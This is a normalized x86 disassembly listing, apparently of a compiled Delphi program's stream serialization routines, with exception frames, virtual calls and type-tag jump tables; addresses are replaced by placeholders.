jmp r-xdata
push ebp
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_3a7eed0
mov ecx [ ebp - 0x28 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_3a7f488
pop ecx
jmp r-xdata
sub_3a7f8fc
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov ebx edx
mov edi eax
xor esi esi
mov eax ebx
mov edx edi
call sub_3a652f4
jmp r-xdata
mov eax [ ebx ]
call sub_3a79e90
test al al
je r-xdata
inc esi
push ebx
mov [ ebp - 0x10 ] edi
mov [ ebp - 0xc ] 0xb
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] 0x0
lea edx [ ebp - 0x10 ]
mov ecx 0x1
mov eax r-xdata
call sub_3a6a850
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3a7f95c
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x28 ] ecx
mov [ ebp - 0x24 ] ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_3a7fc7d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_3a7fd4c
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_3a7fc5b
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_3a7fc1c
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0x11 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x28 ]
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
call sub_3a7fd70
mov eax [ ebp - 0xc ]
test [ eax + 0x1c ] 0x10
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_3a7fd70
mov eax [ ebp - 0x1c ]
call sub_3a799e8
xor ecx ecx
mov dl 0x1
call [ eax + 0x2c ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
call sub_3a7fd70
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
mov eax [ ebp - 0xc ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp - 0xc ]
or [ eax + 0x1c ] 0x2
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0x4 ]
call sub_3a7fd70
mov eax [ ebp - 0x30 ]
lea edx [ ebp - 0x2c ]
call sub_3a7f8fc
mov edx [ ebp - 0x2c ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_3a7fd70
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x18 ] edx
push 0x1
mov eax [ ebp - 0xc ]
call sub_3a64258
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a79738
mov edx [ ebp - 0x4 ]
mov [ edx + 0x84 ] eax
xor eax eax
push ebp
push sub_3a7fbc1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x1c ] edx
call sub_3a672cc
mov eax [ eax + 0x8 ]
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x34 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
or [ eax + 0x1c ] 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
and [ eax + 0x1c ] 0xfffd
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_3a7a33c
xor eax eax
push ebp
push sub_3a7fb9e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_3a7a4f0
test eax eax
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a7fba5
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x34 ] edx
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_3a64380
inc ebx
mov [ ebp - 0x10 ] 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x10 ]
call sub_3a7a494
mov edx [ eax ]
call [ edx + 0xc ]
inc [ ebp - 0x10 ]
dec ebx
jne r-xdata
sub_3a7fbf2
call sub_3a62f64
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
test al al
jne r-xdata
call sub_3a64cb0
jmp r-xdata
call sub_3a64c5c
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_3a7dae0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a7fc62
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_3a7fc21
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_3a7dcac
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
call sub_3a64c5c
call sub_3a64cb0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a7fc62
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
mov eax [ ebp - 0xc ]
call sub_3a64380
sub_3a7fc90
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_3a7fd3a
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_3a7fd0d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_3a7ff4c
cmp al 0xb
je r-xdata
mov eax ebx
call sub_3a76534
mov eax [ eax + 0x1 ]
mov esi [ eax ]
xor ebx ebx
call sub_3a7ddf4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_3a7de2c
cmp eax 0x1f
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a7fd41
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
lea edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_3a7fd70
cmp [ ebp - 0x4 ] 0x0
je r-xdata
bts ebx eax
jmp r-xdata
sub_3a7fd70
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_3a7e3e4
movzx ecx [ esp ]
mov eax esi
xor edx edx
call sub_3a65390
mov eax esi
call j_sub_3a65744#2
mov edx eax
movzx ecx [ esp ]
mov eax ebx
call sub_3a7e3e4
pop edx
pop esi
pop ebx
retn
sub_3a7fdac
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_3a7fe59
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_3a7e3c0
sub al 0x12
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_3a7fe68
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_3a65528
jmp r-xdata
sub al 0x2
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a7fe60
lea eax [ ebp - 0x8 ]
call sub_3a65a7c
retn
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax ebx
call sub_3a7ff4c
sub al 0x6
je r-xdata
lea edx [ ebp - 0x4 ]
mov ecx 0x1
mov eax ebx
call sub_3a7e3e4
jmp r-xdata
sub al 0x6
je r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_3a659c0
mov edx [ esi ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_3a7e3e4
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax ebx
call sub_3a7e3e4
jmp r-xdata
jmp r-xdata
call sub_3a7ddf4
sub_3a7fe68
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_3a7ff3f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_3a7e3c0
sub al 0x6
je r-xdata
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_3a7fdac
mov edx [ ebp - 0xc ]
mov eax esi
call sub_3a65bdc
jmp r-xdata
sub al 0x6
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a7ff46
lea eax [ ebp - 0xc ]
call sub_3a652a0
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax ebx
call sub_3a7ff4c
sub al 0x12
je r-xdata
lea edx [ ebp - 0x8 ]
mov ecx 0x4
mov eax ebx
call sub_3a7e3e4
mov eax esi
mov edx [ ebp - 0x8 ]
call sub_3a65cd8
mov ecx [ ebp - 0x8 ]
add ecx ecx
mov edx [ esi ]
mov eax ebx
call sub_3a7e3e4
jmp r-xdata
sub al 0x2
je r-xdata
lea edx [ ebp - 0x8 ]
mov ecx 0x4
mov eax ebx
call sub_3a7e3e4
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
call sub_3a659c0
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov eax ebx
call sub_3a7e3e4
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_3a6708c
jmp r-xdata
jmp r-xdata
call sub_3a7ddf4
sub_3a7ff60
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_3a7ff9c
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_3a7fd70
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a7ffa3
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
sub_3a7ffa8
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
add ebx 0xfffffffc
jmp r-xdata
mov eax [ ebx ]
call sub_3a7dfc8
test al al
je r-xdata
mov eax [ ebx ]
call sub_3a8005c
mov eax [ ebx ]
call sub_3a7f084
pop ebx
pop ebp
retn
sub_3a7ffd0
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
call sub_3a7e3e4
mov edx [ ebp - 0x4 ]
imul edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_3a80468
pop ebx
pop ecx
pop ebp
retn
sub_3a80000
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
add ebx 0xfffffffc
jmp r-xdata
mov eax [ ebx ]
call sub_3a7dfc8
test al al
je r-xdata
mov eax [ ebx ]
call sub_3a7e3c0
add al 0xfe
sub al 0x3
jae r-xdata
mov eax [ ebx ]
call sub_3a7f084
pop ebx
pop ebp
retn
mov eax [ ebx ]
mov edx 0x1
call sub_3a80468
jmp r-xdata
mov eax [ ebx ]
call sub_3a8005c
mov eax [ ebx ]
call sub_3a7dfc8
test al al
je r-xdata
mov eax [ ebx ]
call sub_3a8020c
mov eax [ ebx ]
call sub_3a7f084
sub_3a8005c
push ebp
mov ebp esp
add esp 0xfffffff8
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_3a80201
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_3a7ff4c
and eax 0x7f
cmp eax 0x15
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a80208
lea eax [ ebp - 0x8 ]
call sub_3a652a0
retn
jmp [ eax * 4 + jump_table_3a80093 ]
push ebp
call sub_3a7ffa8
pop ecx
jmp r-xdata
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_3a80468
jmp r-xdata
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_3a80468
jmp r-xdata
mov edx 0x4
mov eax [ ebp - 0x4 ]
call sub_3a80468
jmp r-xdata
mov edx 0xa
mov eax [ ebp - 0x4 ]
call sub_3a80468
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_3a7fd70
jmp r-xdata
push ebp
mov eax 0x1
call sub_3a7ffd0
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_3a7ff60
jmp r-xdata
push ebp
mov eax 0x1
call sub_3a7ffd0
pop ecx
jmp r-xdata
push ebp
call sub_3a80000
pop ecx
jmp r-xdata
mov edx 0x4
mov eax [ ebp - 0x4 ]
call sub_3a80468
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_3a80468
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_3a80468
jmp r-xdata
push ebp
mov eax 0x2
call sub_3a7ffd0
pop ecx
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_3a80468
jmp r-xdata
push ebp
mov eax 0x1
call sub_3a7ffd0
pop ecx
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_3a80468
sub_3a8020c
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_3a80249
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_3a7fd70
mov eax ebx
call sub_3a8005c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a80250
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
sub_3a80254
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_3a802ec
push [ fs : eax ]
mov [ fs : eax ] esp
test dl dl
je r-xdata
mov eax ebx
call sub_3a7dfc8
test al al
je r-xdata
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0x1 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x28 ]
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_3a7fd70
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_3a7fd70
jmp r-xdata
mov eax ebx
call sub_3a8020c
mov eax ebx
call sub_3a7f084
jmp r-xdata
mov eax ebx
call sub_3a7dfc8
test al al
je r-xdata
mov dl 0x1
mov eax ebx
call sub_3a80254
mov eax ebx
call sub_3a7f084
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a802f3
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_3a652c4
retn
sub_3a802fc
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_3a803a1
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_3a65338
xor eax eax
mov [ ebp - 0x8 ] eax
mov esi [ ebx + 0x1c ]
test esi esi
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_3a83b84
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a803a8
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
cmp [ ebx + 0x5a ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
push edi
lea eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax [ ebx + 0x5c ]
call [ ebx + 0x58 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d410
call sub_3a64c34
sub_3a803cc
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
cmp [ eax + 0x4a ] 0x0
je r-xdata
mov edx [ esi ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
pop edi
pop esi
pop ebx
retn
push esi
mov edi eax
mov ecx ebx
mov edx eax
mov eax [ edi + 0x4c ]
call [ edi + 0x48 ]
sub_3a803f4
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov ecx esi
mov edx [ ebx + 0x18 ]
mov eax ebx
call sub_3a7e310
mov [ esp ] eax
cmp [ esp ] 0x0
jne r-xdata
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ esp ] 0x0
je r-xdata
push esp
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x6c ]
call [ ebx + 0x68 ]
mov eax [ ebx + 0x1c ]
cmp eax [ ebx + 0x18 ]
je r-xdata
mov eax esi
call sub_3a79928
mov edx [ r-xdata ]
mov eax [ esp ]
call sub_3a645ac
test al al
jne r-xdata
mov ecx esi
mov edx [ ebx + 0x1c ]
mov eax ebx
call sub_3a7e310
mov [ esp ] eax
mov eax [ esp ]
pop edx
pop esi
pop ebx
retn
sub_3a80468
push ebx
push esi
add esp 0xffffff00
mov ebx edx
mov esi eax
test ebx ebx
jle r-xdata
add esp 0x100
pop esi
pop ebx
retn
cmp ebx 0x100
jle r-xdata
mov edx esp
mov ecx ebx
mov eax esi
call sub_3a7e3e4
xor ebx ebx
mov edx esp
mov ecx 0x100
mov eax esi
call sub_3a7e3e4
sub ebx 0x100
jmp r-xdata
test ebx ebx
jg r-xdata
sub_3a804b0
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
xor edx edx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_3a80659
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov dl 0xa
call sub_3a7de80
xor eax eax
mov [ ebp - 0x10 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_3a80634
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov [ ebp - 0x10 ] eax
lea edx [ ebp - 0x18 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
call sub_3a7e3e4
mov eax [ ebp - 0x18 ]
cdq
push edx
push eax
mov eax [ ebp - 0xc ]
call sub_3a7cc20
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x18 ]
call sub_3a7e3e4
push 0x400
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a7d714
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_3a8060f
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ ebp - 0x14 ]
call sub_3a7fdac
lea edx [ ebp - 0x18 ]
mov ecx 0x4
mov eax [ ebp - 0x14 ]
call sub_3a7e3e4
mov eax [ ebp - 0x18 ]
cdq
push edx
push eax
mov eax [ ebp - 0x10 ]
call sub_3a7cc20
mov eax [ ebp - 0x10 ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0x18 ]
mov eax [ ebp - 0x14 ]
call sub_3a7e3e4
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_3a76248
test al al
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d3d4
call sub_3a64c34
lea eax [ ebp - 0x8 ]
call sub_3a66cb4
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x1c ]
call sub_3a6eff0
test al al
jne r-xdata
mov eax [ ebp - 0x1c ]
movzx eax [ eax + 0x4 ]
mov [ ebx ] ax
mov edx ebx
mov ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a80616
mov eax [ ebp - 0x14 ]
call sub_3a64380
retn
sub_3a80678
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_3a8088a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_3a70c58
mov eax [ ebp - 0x4 ]
call sub_3a7e3c0
and eax 0x7f
cmp eax 0x15
ja r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d3d4
call sub_3a64c34
jmp [ eax * 4 + jump_table_3a806ba ]
mov eax [ ebp - 0x4 ]
call sub_3a7ff4c
cmp al 0xd
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_3a7efcc
mov edx eax
movsx edx dl
mov eax ebx
mov cl 0xff
call sub_3a74de8
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_3a7efcc
mov edx eax
movsx edx dx
mov eax ebx
mov cl 0xfe
call sub_3a74de8
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_3a7efcc
mov edx eax
mov eax ebx
mov cl 0xfc
call sub_3a74de8
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_3a7ed7c
mov eax ebx
call sub_3a74fe0
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_3a7edf8
mov eax ebx
call sub_3a74fe0
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_3a7edb4
mov eax ebx
call sub_3a74fe0
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_3a7ee3c
mov eax ebx
call sub_3a75008
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_3a7ee8c
mov eax ebx
call sub_3a74ff4
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_3a7fdac
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_3a7501c
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_3a7fe68
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_3a75048
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_3a7ff4c
cmp al 0x9
sete dl
mov eax ebx
call sub_3a74fb8
jmp r-xdata
push ebp
lea eax [ ebp - 0x1c ]
call sub_3a804b0
pop ecx
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_3a70f80
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_3a7f038
push edx
push eax
mov eax ebx
call sub_3a74ee4
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a80891
lea eax [ ebp - 0x1c ]
call sub_3a70c6c
lea eax [ ebp - 0xc ]
call sub_3a65a7c
lea eax [ ebp - 0x8 ]
call sub_3a652a0
retn
mov eax ebx
call sub_3a76330
jmp r-xdata
sub_3a80898
push ebx
push esi
call sub_3a6478c
mov ebx edx
mov esi eax
mov eax esi
call sub_3a80ac0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_3a7d75c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_3a64734
sub_3a808d0
push ebp
mov ebp esp
push ebx
mov ebx eax
test cl cl
je r-xdata
pop ebx
pop ebp
retn 0x10
cmp [ ebp + 0xa ] 0x0
je r-xdata
mov eax ebx
call sub_3a82b1c
mov edx ebx
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
sub_3a808f8
push ebp
mov ebp esp
push ebx
mov ebx eax
test cl cl
je r-xdata
pop ebx
pop ebp
retn 0x10
cmp [ ebp + 0xa ] 0x0
je r-xdata
mov eax ebx
call sub_3a82b1c
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax ebx
call sub_3a80a38
sub_3a80934
push ebx
push esi
push edi
add esp 0xfffffef8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
mov ebx eax
mov eax esi
call sub_3a652a0
cmp [ ebx + 0x4a ] 0x0
je r-xdata
cmp [ esi ] 0x0
jne r-xdata
push esi
lea ecx [ esp + 0x4 ]
mov edx ebx
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
add esp 0x108
pop edi
pop esi
pop ebx
retn
lea ecx [ esp + 0x8 ]
mov eax [ ebx + 0x1c ]
mov eax [ eax ]
mov edx [ esp ]
call sub_3a64654
lea edx [ esp + 0x8 ]
mov eax esi
call sub_3a65504
sub_3a80998
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
call sub_3a7cb9c
cmp eax esi
jg r-xdata
mov eax ebx
call sub_3a80ac0
mov eax esi
cdq
push edx
push eax
mov eax [ ebx + 0x4 ]
call sub_3a7cbbc
pop esi
pop ebx
retn
mov edx [ ebx + 0x10 ]
add edx eax
cmp esi edx
jle r-xdata
sub esi eax
mov [ ebx + 0x10 ] esi
pop esi
pop ebx
retn
sub_3a809ec
push esi
push edi
push ebx
mov esi edx
mov ebx ecx
mov edi eax
jmp r-xdata
or ebx ebx
jne r-xdata
mov ecx [ edi + 0xc ]
sub ecx [ edi + 0x10 ]
ja r-xdata
pop ebx
pop edi
pop esi
retn
cmp ecx ebx
jb r-xdata
mov eax edi
call sub_3a80ac0
mov ecx [ edi + 0xc ]
sub ebx ecx
push edi
mov eax [ edi + 0x8 ]
add eax [ edi + 0x10 ]
add [ edi + 0x10 ] ecx
mov edi eax
mov edx ecx
shr ecx 0x2
cld
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop edi
mov ecx ebx
sub_3a80a38
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_3a80aaf
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov dl 0xa
mov eax ebx
call sub_3a82d84
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x8 ]
mov ecx 0x4
mov eax ebx
call sub_3a809ec
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0x8 ]
mov eax ebx
call sub_3a809ec
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a80ab6
mov eax [ ebp - 0x4 ]
call sub_3a64380
retn
sub_3a80aec
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_3a80b2f
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_3a65488
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_3a82c78
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a80b36
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
sub_3a80b3c
push ebp
mov ebp esp
push 0x0
